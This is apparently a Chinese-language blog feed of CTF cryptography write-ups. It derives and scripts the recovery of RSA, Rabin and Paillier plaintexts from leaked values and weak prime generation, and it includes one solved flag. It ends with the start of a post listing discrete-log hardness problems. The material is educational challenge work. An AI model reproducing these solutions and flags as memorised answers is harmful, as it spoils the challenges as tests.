<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = var(<span class="string">&#x27;p1&#x27;</span>)</span><br><span class="line">q1 = var(<span class="string">&#x27;q1&#x27;</span>)</span><br><span class="line">sol1 = solve([<span class="number">2</span>*p1 - <span class="number">2</span>*(q1-<span class="number">1</span>) - leak1, p1*q1 - n1], [p1, q1])</span><br><span class="line"><span class="comment"># p1 = 11060083511635869933802569808428381768947206326091523957729804139074727442704400779515603361330886302679144280198610157348614007053927945774770324805383761</span></span><br><span class="line"><span class="comment"># q1 = 10951764080317305242419751556869357195913698564129507860483453991974582578672251918471161965453710637975575181911693960925380203354175653252256241955673123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>DEDUCTION-2</strong></p>
<p>依旧先得到:<br>
$$<br>
leak \equiv 2p \mod (q-1)<br>
$$</p>
<p>$$<br>
leak = 2p + k(q-1)<br>
$$</p>
<p>一般来说，$k$ 的量级不会太大，可以直接<strong>爆破</strong>。而且$p &gt; q$，基本情况下可简化为$p - (q - 1)$。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;x&gt; = PolynomialRing(ZZ)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">    f = k * (x - <span class="number">1</span>) * x + leak1 * x - <span class="number">2</span> * n1</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        q1 = f.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print(q1)</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">p1 = n1 // q1</span><br></pre></td></tr></table></figure>
<h2 id="challenge-2">challenge 2</h2>
<ul>
<li>crack</li>
<li>limitation</li>
</ul>
<p><strong>KEY</strong><br>
$$<br>
leak = d + p + q<br>
$$</p>
<p>$$<br>
e\cdot d \equiv 1 \mod phi<br>
$$</p>
<p><strong>DEDUCTION-1</strong><br>
$$<br>
\because phi = (p-1) \times (q-1) = n - (p + q) + 1<br>
$$</p>
<p>$$<br>
\therefore p + q = n + 1 - phi<br>
$$</p>
<p>利用<strong>KEY-1</strong>以及<strong>KEY-2</strong>进行代入处理：<br>
$$<br>
e\cdot(leak - (p + q)) = 1 + k \times phi<br>
$$</p>
<p>$$<br>
\Longrightarrow e \cdot (leak - n - 1 + phi) = 1 + k\times phi<br>
$$</p>
<p>$$<br>
\Longrightarrow (e - k)\times phi = e(n + 1 - leak) + 1<br>
$$</p>
<p>$$<br>
\therefore phi = (e(n + 1 - leak) + 1) // (e - k)<br>
$$</p>
<p>所以，存在$k \in [1, e-1]$，使得上式成立，再利用<code>flag</code>的特殊格式进行判断，因此，我们可以得到两个判断条件。</p>
<ul>
<li>$phi \mod (e - k) == 0$</li>
<li><code>flag[4:5] == '-' and flag[9:10] == '-'</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65537</span>):</span><br><span class="line">    <span class="keyword">if</span> (e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span>) % (e2 - k) == <span class="number">0</span>:</span><br><span class="line">        phi = (e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span>) // (e2 - k)</span><br><span class="line">        d2 = <span class="built_in">int</span>(invert(e2, phi))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">            flag2 = (long_to_bytes(m2)[:<span class="number">14</span>]).decode()</span><br><span class="line">            <span class="keyword">if</span> flag2[<span class="number">4</span>:<span class="number">5</span>] == <span class="string">&#x27;-&#x27;</span> <span class="keyword">and</span> flag2[<span class="number">9</span>:<span class="number">10</span>] == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(flag2)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><strong>DEDUCTION-2</strong></p>
<p>可得：<br>
$$<br>
(e - k)\times phi = e(n + 1 - leak) + 1<br>
$$<br>
简化一下，即为：<br>
$$<br>
Kphi = e(n + 1 - leak) + 1<br>
$$<br>
此时可以直接利用求逆元的方式求解私钥$d$：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">K_phi = e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">d2 = <span class="built_in">int</span>(invert(e2, K_phi))</span><br></pre></td></tr></table></figure>
<p><em>模phi以及模Kphi，等价</em></p>
<h2 id="challenge-3">challenge 3</h2>
<ul>
<li>fermat</li>
</ul>
<p><strong>KEY</strong><br>
$$<br>
leak \equiv (p^{q} \mod n + q^{p} \mod n) \mod n<br>
$$</p>
<p>$$<br>
\mod n \rightarrow \mod p /\mod q<br>
$$</p>
<p><strong>DEDUCTION-1</strong><br>
$$<br>
leak \equiv p^{q} \mod n + q^{p}\mod n<br>
$$</p>
<p>$$<br>
\Longrightarrow leak \equiv p^{q} \mod q + q^{p} \mod p<br>
$$</p>
<p>利用费马小定理$a^p \equiv a \mod p$，我们可以得到：<br>
$$<br>
\Longrightarrow leak = p + q<br>
$$<br>
跟$n = p \times q$ 联立方程，可求解出$p$以及$q$。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p3, q3 = var(<span class="string">&#x27;p3 q3&#x27;</span>)</span><br><span class="line">sol3 = solve([p3 + q3 - leak3, p3 * q3 - n3], [p3, q3])</span><br><span class="line"><span class="built_in">print</span>(sol3[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p><strong>DEDUCTION-2</strong></p>
<p>可得：<br>
$$<br>
leak \equiv p^{q} \mod n + q^{p}\mod n<br>
$$</p>
<p>$$<br>
\rightarrow leak = p + k_1 q<br>
$$</p>
<p>$$<br>
\rightarrow leak = q + k_2 p<br>
$$</p>
<p>$$<br>
\Longrightarrow p + k_1 q = q + k_2 p<br>
$$</p>
<p>$$<br>
\therefore k_1 = 1, k_2 = 1<br>
$$</p>
<p>$$<br>
\Longrightarrow leak = p + q<br>
$$</p>
<p>回归上面的代码，联立方程求解$p$以及$q$。</p>
<h2 id="CODE">CODE</h2>
<p><strong>sagemath</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># %%</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">def unpad(msg):</span><br><span class="line">    return msg.split(b&#x27;\x00&#x27;)[0]</span><br><span class="line"></span><br><span class="line"># challenge 1</span><br><span class="line">e1 = 65537</span><br><span class="line">c1 = 112742443814287255411540092433156061065388404049949520959549377871297566383025041892192679147481155020865118811016470498351633875090973546567374001852295013083192495299811476604405637385307524194793969533646755764136014187430115618114840780368311166911900457224593131166970676797547489278410997707815915932756</span><br><span class="line">n1 = 121127425328043404860413278637978444801342472819958112597540188142689720655042880213001676368390521140660355813910726809125567752172921410143437643574528335234973793653775043030021036875866776532570781661875022102733555943967261003246543180935987772711036868216508554536086688819118597075508026787867088355603</span><br><span class="line">leak1 = 216638862637129382765636503118049146067015523924032194492700294200289728064297722088882791754351329407138196573832392846467607399504585045028165699421278</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZZ)</span><br><span class="line">for k in range(1, 4):</span><br><span class="line">    f = k * (x - 1) * x + leak1 * x - 2 * n1</span><br><span class="line">    try:</span><br><span class="line">        q1 = f.roots()[0][0]</span><br><span class="line">        # print(q1)</span><br><span class="line">        break</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">p1 = n1 // q1</span><br><span class="line">d1 = invert(e1, (p1 - 1)*(q1 - 1))</span><br><span class="line">m1 = int(powmod(c1, d1, n1))</span><br><span class="line">flag1 = unpad(long_to_bytes(m1)).decode()</span><br><span class="line">print(flag1)</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># challenge 2</span><br><span class="line">e2 = 65537</span><br><span class="line">c2 = 7964477910021153997178145480752641882728907630831216554750778499596527781702830885213467912351097301767341858663701574005489585561370961723264247818377063081744522471774208105250855114831033452448184392499682147532404562876275189577321587660597603848038824026981539659156304028998137796242331160312370913038</span><br><span class="line">n2 = 140571013522095816880929287025269553867630639381779595547026503691829940612178900269986625350464874598461222087427155791855120339533208468121389480964471710028253589422629569889402475311387750348466199387760629889238062977271925350490110043385800605640905324122017637306715108727700910035925728362455954862209</span><br><span class="line">leak2 = 58442382248753295429370894053397615609981110383986887405127350139482893508400422595729520437678203735054593866306478994471465948872565590901376309380029015549809468112086393107585011072503638322671608471684607214064187044372418770555236721845694224676090744181562673509234801011420696349507624867568099759003</span><br><span class="line"></span><br><span class="line">K_phi = e2 * (n2 - leak2 + 1) + 1</span><br><span class="line">d2 = int(invert(e2, K_phi))</span><br><span class="line">m2 = int(pow(c2, d2, n2))</span><br><span class="line">flag2 = unpad(long_to_bytes(m2)).decode()</span><br><span class="line">print(flag2)</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># challenge 3</span><br><span class="line">e3 = 65537</span><br><span class="line">c3 = 54161995127842474543974770981473422085334044100057089719350274921419091368361244533281599379235907845996678762379778310924192757650322930707785543132446159092950451255660204858292974657119337026589911330412367633761103944916751660957776230135927005700707688661350641600954072696774954805514477330339449799540</span><br><span class="line">n3 = 88207747624007183083381863279444163105330473097729276113333026679597864128605555600000789783468271680476780366740448641311570797876037993255307716167149079618302706650018518487351604778857406170722209469765782625409279109832638886179654096975665134276856272488090272822541461702907181545730309689190333058151</span><br><span class="line">leak3 = 19596671928335648228117128090384865424885102632642665068992144783391306491716530155291726644158221224616817878768426330717188403310818678195631582453246848</span><br><span class="line"></span><br><span class="line"># p3, q3 = var(&#x27;p3 q3&#x27;)</span><br><span class="line"># sol3 = solve([p3 + q3 - leak3, p3 * q3 - n3], [p3, q3])</span><br><span class="line"># print(sol3)</span><br><span class="line">p3 = 12591119529483514723681507251180531324926419443874102860338530066728710197246719851038994673567739600391874839712324936583490370533180101117667257937826949</span><br><span class="line">q3 = 7005552398852133504435620839204334099958683188768562208653614716662596294469810304252731970590481624224943039056101394133698032777638577077964324515419899</span><br><span class="line">d3 = invert(e3, (p3 - 1)*(q3 - 1))</span><br><span class="line">m3 = int(powmod(c3, d3, n3))</span><br><span class="line">flag3 = unpad(long_to_bytes(m3)).decode()</span><br><span class="line">print(flag3)</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line">flag = flag1 + flag2 + flag3</span><br><span class="line">assert len(flag) == 42</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>python</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># chall 1</span></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">c1 = <span class="number">112742443814287255411540092433156061065388404049949520959549377871297566383025041892192679147481155020865118811016470498351633875090973546567374001852295013083192495299811476604405637385307524194793969533646755764136014187430115618114840780368311166911900457224593131166970676797547489278410997707815915932756</span></span><br><span class="line">n1 = <span class="number">121127425328043404860413278637978444801342472819958112597540188142689720655042880213001676368390521140660355813910726809125567752172921410143437643574528335234973793653775043030021036875866776532570781661875022102733555943967261003246543180935987772711036868216508554536086688819118597075508026787867088355603</span></span><br><span class="line">leak1 = <span class="number">216638862637129382765636503118049146067015523924032194492700294200289728064297722088882791754351329407138196573832392846467607399504585045028165699421278</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">法1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># p1 = var(&#x27;p1&#x27;)</span></span><br><span class="line"><span class="comment"># q1 = var(&#x27;q1&#x27;)</span></span><br><span class="line"><span class="comment"># sol1 = solve([2*p1 - 2*(q1-1) - leak1, p1*q1 - n1], [p1, q1])</span></span><br><span class="line">p1 = <span class="number">11060083511635869933802569808428381768947206326091523957729804139074727442704400779515603361330886302679144280198610157348614007053927945774770324805383761</span></span><br><span class="line">q1 = <span class="number">10951764080317305242419751556869357195913698564129507860483453991974582578672251918471161965453710637975575181911693960925380203354175653252256241955673123</span></span><br><span class="line"><span class="keyword">assert</span> p1 &gt; q1</span><br><span class="line"><span class="keyword">from</span> Functions_Eurynome <span class="keyword">import</span> Original_RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m1 = Original_RSA(p1, q1, e1, c1, n1)</span><br><span class="line">flag1 = (long_to_bytes(m1)[:<span class="number">14</span>]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chall 2</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">7964477910021153997178145480752641882728907630831216554750778499596527781702830885213467912351097301767341858663701574005489585561370961723264247818377063081744522471774208105250855114831033452448184392499682147532404562876275189577321587660597603848038824026981539659156304028998137796242331160312370913038</span></span><br><span class="line">n2 = <span class="number">140571013522095816880929287025269553867630639381779595547026503691829940612178900269986625350464874598461222087427155791855120339533208468121389480964471710028253589422629569889402475311387750348466199387760629889238062977271925350490110043385800605640905324122017637306715108727700910035925728362455954862209</span></span><br><span class="line">leak2 = <span class="number">58442382248753295429370894053397615609981110383986887405127350139482893508400422595729520437678203735054593866306478994471465948872565590901376309380029015549809468112086393107585011072503638322671608471684607214064187044372418770555236721845694224676090744181562673509234801011420696349507624867568099759003</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">法1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># for k in range(1, 65537):</span></span><br><span class="line"><span class="comment">#     if (e2 * (n2 - leak2 + 1) + 1) % (e2 - k) == 0:</span></span><br><span class="line"><span class="comment">#         phi = (e2 * (n2 - leak2 + 1) + 1) // (e2 - k)</span></span><br><span class="line"><span class="comment">#         d2 = int(invert(e2, phi))</span></span><br><span class="line"><span class="comment">#         try:</span></span><br><span class="line"><span class="comment">#             m2 = pow(c2, d2, n2)</span></span><br><span class="line"><span class="comment">#             flag2 = (long_to_bytes(m2)[:14]).decode()</span></span><br><span class="line"><span class="comment">#             if flag2[4:5] == &#x27;-&#x27; and flag2[9:10] == &#x27;-&#x27;:</span></span><br><span class="line"><span class="comment">#                 print(flag2)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#         except:</span></span><br><span class="line"><span class="comment">#             pass</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">法2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">K_phi = e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">d2 = <span class="built_in">int</span>(invert(e2, K_phi))</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">flag2 = (long_to_bytes(m2)[:<span class="number">14</span>]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chall 3</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">c3 = <span class="number">54161995127842474543974770981473422085334044100057089719350274921419091368361244533281599379235907845996678762379778310924192757650322930707785543132446159092950451255660204858292974657119337026589911330412367633761103944916751660957776230135927005700707688661350641600954072696774954805514477330339449799540</span></span><br><span class="line">n3 = <span class="number">88207747624007183083381863279444163105330473097729276113333026679597864128605555600000789783468271680476780366740448641311570797876037993255307716167149079618302706650018518487351604778857406170722209469765782625409279109832638886179654096975665134276856272488090272822541461702907181545730309689190333058151</span></span><br><span class="line">leak3 = <span class="number">19596671928335648228117128090384865424885102632642665068992144783391306491716530155291726644158221224616817878768426330717188403310818678195631582453246848</span></span><br><span class="line"><span class="comment"># p3, q3 = var(&#x27;p3 q3&#x27;)</span></span><br><span class="line"><span class="comment"># sol3 = solve([p3 + q3 - leak3, p3 * q3 - n3], [p3, q3])</span></span><br><span class="line"><span class="comment"># print(sol3[1])</span></span><br><span class="line">p3 = <span class="number">12591119529483514723681507251180531324926419443874102860338530066728710197246719851038994673567739600391874839712324936583490370533180101117667257937826949</span></span><br><span class="line">q3 = <span class="number">7005552398852133504435620839204334099958683188768562208653614716662596294469810304252731970590481624224943039056101394133698032777638577077964324515419899</span></span><br><span class="line">m3 = Original_RSA(p3, q3, e3, c3, n3)</span><br><span class="line">flag3 = (long_to_bytes(m3)[:<span class="number">14</span>]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag3)</span><br><span class="line"></span><br><span class="line">flag = flag1 + flag2 + flag3</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h1>[NSSCTF-round11]ez_signin</h1>
<ul>
<li>basic</li>
<li>deduction</li>
<li>rabin</li>
</ul>
<p>$$<br>
num1 \equiv p^e \mod - q^e \mod n \equiv p^e - q^e \mod n<br>
$$</p>
<p>利用二项式展开定理对其进行展开以及模运算：<br>
$$<br>
num2 \equiv (p + q)^e \mod n \equiv p^e + q^e \mod n<br>
$$</p>
<p>{1}式 + {2}式可得：<br>
$$<br>
num1 + num2 \equiv 2 p^e \mod n<br>
$$<br>
又从题目得到$n = p \times q$，利用<code>gcd()</code>可得<code>p</code>：<br>
$$<br>
p = gcd(num1 + num2, n)<br>
$$<br>
而<code>q</code>即为$q = n // p$.</p>
<p>得到<code>p</code>以及<code>q</code>后，发现$p\equiv q \equiv 3 \mod 4$，而$e = 65536 = 2^{16}$，可得下一个知识点为<code>Rabin</code>算法，且循环使用16次。</p>
<p>所以我们对原始的<code>c</code>先进行一次<code>Rabin</code>，所得的四个明文作为<code>c</code>继续循环使用<code>Rabin</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num1 = <span class="number">134186458247304184975418956047750205959249518467116558944535042073046353646812210914711656218265319503240074967140027248278994209294869476247136854741631971975560846483033205230015783696055443897579440474585892990793595602095853960468928457703619205343030230201261058516219352855127626321847429189498666288452</span></span><br><span class="line">num2 = <span class="number">142252615203395148320392930915384149783801592719030740337592034613073131106036364733480644482188684184951026866672011061092572389846929838149296357261088256882232316029199097203257003822750826537629358422813658558008420810100860520289261141533787464661186681371090873356089237613080052677646446751824502044253</span></span><br><span class="line">n = <span class="number">154128165952806886790805410291540694477027958542517309121222164274741570806324940112942356615458298064007096476638232940977238598879453357856259085001745763666030177657087772721079761302637352680091939676709372354103177660093164629417313468356185431895723026835950366030712541994019375251534778666996491342313</span></span><br><span class="line">c = <span class="number">9061020000447780498751583220055526057707259079063266050917693522289697419950637286020502996753375864826169562714946009146452528404466989211057548905704856329650955828939737304126685040898740775635547039660982064419976700425595503919207903099686497044429265908046033565745195837408532764433870408185128447965</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">p = gcd(num1 + num2, n)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> is_prime(p)</span><br><span class="line"><span class="keyword">assert</span> is_prime(q)</span><br><span class="line"><span class="keyword">assert</span> p % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line"><span class="comment"># print(p.bit_length())</span></span><br><span class="line"><span class="comment"># print(q.bit_length())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 65536 == 2**16</span></span><br><span class="line">cs = [c]</span><br><span class="line"></span><br><span class="line">gcd, yp, yq = gcdext(p, q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> cc <span class="keyword">in</span> cs:</span><br><span class="line">        mp = powmod(cc, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">        mq = powmod(cc, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line">        m1 = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">        m2 = n - m1</span><br><span class="line">        m3 = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">        m4 = n - m3</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m1)</span><br><span class="line">        <span class="keyword">if</span> m2 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m2)</span><br><span class="line">        <span class="keyword">if</span> m3 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m3)</span><br><span class="line">        <span class="keyword">if</span> m4 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m4)</span><br><span class="line"></span><br><span class="line">    cs = ps</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> ps:</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;nss&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># nssctf&#123;W3lc0me_t0_nssctf_R0undll_w15h_U_can_have_Fun_t0day!!!#0919&#125;</span></span><br></pre></td></tr></table></figure>
<h1>[DASCTF2020-4]not RSA</h1>
<blockquote>
<p>relating: [网鼎杯2020华南区复赛]paillier</p>
</blockquote>
<ul>
<li>paillier-2</li>
</ul>
<p>$n$比较小，直接<code>yafu</code>分解或者费马分解都可以。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line">n = <span class="number">6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># yafu</span></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line"></span><br><span class="line">L = <span class="keyword">lambda</span> x: (x - <span class="number">1</span>) // n</span><br><span class="line">lam = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line">miu = invert(lam, n)</span><br><span class="line"></span><br><span class="line">m = L(<span class="built_in">pow</span>(c, <span class="built_in">int</span>(lam), n*n)) * miu % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h1>[GKCTF2020]Backdoor</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. cve查看漏洞，对n进行爆破，求解p,q</span><br><span class="line">2. pub.pem提取e,n flag.enc提取c</span><br><span class="line">3. ==&gt; Original_RSA()</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=k*M+(65537**a %M)</span><br></pre></td></tr></table></figure>
<h2 id="p-k-times-M-65537-a-mod-M-BackdoorCVE求解p-q">$p = k \times M + (65537^{a} mod M)$BackdoorCVE求解p,q</h2>
<blockquote>
<p><a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<h1>[NepCTF2022]中学数学</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 核心生成</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p + (p &gt;&gt; <span class="number">500</span>))</span><br></pre></td></tr></table></figure>
<h2 id="q-next-prime-p-p-500">q = next_prime(p+(p&gt;&gt;500))</h2>
<p>转换成数学公式$q = p + \frac{1}{2^{500}}\cdot{p} + r = (1 + \frac{1}{2^{500}})p + r$</p>
<p>此时：$r$为凑到素数的最小整数</p>
<h2 id="n-p-q">n = p*q</h2>
<p>代入$q$得到：<br>
$$<br>
n = p\cdot q<br>
$$</p>
<p>$$<br>
n = p\cdot((1+\frac{1}{2^{500}})p + r)<br>
$$</p>
<p>$$<br>
n = (1+\frac{1}{2^{500}})\cdot p^{2} + r\cdot p<br>
$$</p>
<h2 id="凑平方">凑平方</h2>
<p>等式左右两边同时乘上$(1+\frac{1}{2^{500}})$，凑出平方：<br>
$$<br>
(1+ \frac{1}{2^{500}})n = ((1+\frac{1}{2^{500}})p)^{2}+(1+\frac{1}{2^{500}})rp<br>
\ &gt; ((1+\frac{1}{2^{500}})p)^{2}<br>
$$</p>
<h2 id="进行约束计算">进行约束计算</h2>
<p>$$<br>
(1+ \frac{1}{2^{500}})n = ((1+\frac{1}{2^{500}})p)^{2}+(1+\frac{1}{2^{500}})rp \tag1<br>
$$</p>
<p>$$<br>
q^{2} = ((1+\frac{1}{2^{500}})p + r)^{2}=((1+ \frac{1}{2^{500}})p)^{2} + (1+\frac{1}{2^{500}})rp + (1+\frac{1}{2^{500}})rp + r^{2} \tag2\<br>
$$</p>
<p>显然$(2)$大于$(1)$</p>
<h2 id="结论">结论</h2>
<p>$$<br>
(1+\frac{1}{2^{500}})p &lt; \sqrt{n(1+\frac{1}{2^{500}}}) &lt; (1+\frac{1}{2^{500}})p+r = q<br>
$$</p>
<p>此时<code>next_prime(iroot(n+(n&gt;&gt;500))[0])</code>为$q$，然后转换成基础RSA。</p>
<h2 id="根据结论得到q，转换成基础RSA">根据结论得到q，转换成基础RSA</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = next_prime(iroot(n+(n&gt;&gt;<span class="number">500</span>), <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p = n // q</span><br><span class="line"><span class="comment"># 转换成基础RSA</span></span><br></pre></td></tr></table></figure>
<h1>[NewStarCTF2022]RSA_begin</h1>
<h2 id="Level5-ppq型hint-简单数学推导">Level5-ppq型hint/简单数学推导</h2>
<p>已知：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p * p * q</span><br><span class="line">N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(p)</span><br><span class="line">d = inverse(e, N)</span><br></pre></td></tr></table></figure>
<p>$$<br>
c \equiv m^{e} \mod n<br>
$$</p>
<p>$$<br>
hint \equiv d^{e} \mod n<br>
$$</p>
<p>$$<br>
de \equiv 1 \mod \varphi(n)<br>
$$</p>
<p><strong>根据已知条件进行推导</strong><br>
$$<br>
d^{e} = hint + k_{1} \cdot p\ \tag{1}<br>
$$</p>
<p>$$<br>
d\cdot e = 1 + k_{2}\cdot p \tag{2}<br>
$$</p>
<p>通过<strong>同余性</strong>对（2）式进行变形，并代入（1）式<br>
$$<br>
(d\cdot e)^{e} = 1 + k_{3}\cdot p \tag{3}<br>
$$</p>
<p>$$<br>
d^{e}\cdot e^{e} = hint\cdot e^{e} + k_{4}\cdot p<br>
$$</p>
<p>整理得（5），即左边含$p$因子<br>
$$<br>
hint\cdot e^{e} - 1 = k_{5}\cdot p \tag{5}<br>
$$<br>
又因为$n = p\cdot p\cdot q$</p>
<p>所以最终可得到<br>
$$<br>
gcd(hint\cdot e^{e} - 1, n) = p \tag{6}<br>
$$<br>
通过（6），即可把关键因素$p$求解出来。</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>recurrent</tag>
      </tags>
  </entry>
  <entry>
    <title>Description-About-Common-Difficult-Problems-in-Cryptography</title>
    <url>/2023/03/02/Description-about-common-difficult-problems-in-cryptography/</url>
    <content><![CDATA[<p>Descriptions about the common difficult problems in cryptography.</p>
<p>I will learn about them in the nearly future.</p>
<span id="more"></span><!--toc-->
<blockquote>
<p><a href="https://web.archive.org/web/20120121090326/http://www.ecrypt.eu.org/wiki/index.php/Main_Page">web.archive.org</a></p>
</blockquote>
<h1>Discrete logarithm problem</h1>
<ul>
<li>DLP: discrete logarithm problem</li>
<li>CDH: computational Diffie-Hellman problem</li>
<li>SDH: static Diffie-Hellman problem</li>
<li>gap-CDH: Gap Diffie-Hellman problem</li>
<li>DDH: decision Diffie-Hellman problem</li>
<li>Strong-DDH: strong decision Diffie-Hellman problem</li>
<li>sDDH: skewed decision Diffie-Hellman problem</li>
<li>PDDH: parallel decision Diffie-Hellman problem</li>
<li>Square-DH: Square Diffie-Hellman problem</li>
<li>l-DHI: l-Diffie-Hellman inversion problem</li>
<li>l-DDHI: l-Decisional Diffie-Hellman inversion problem</li>
<li>REPRESENTATION: Representation problem</li>
<li>LRSW: LRSW Problem</li>
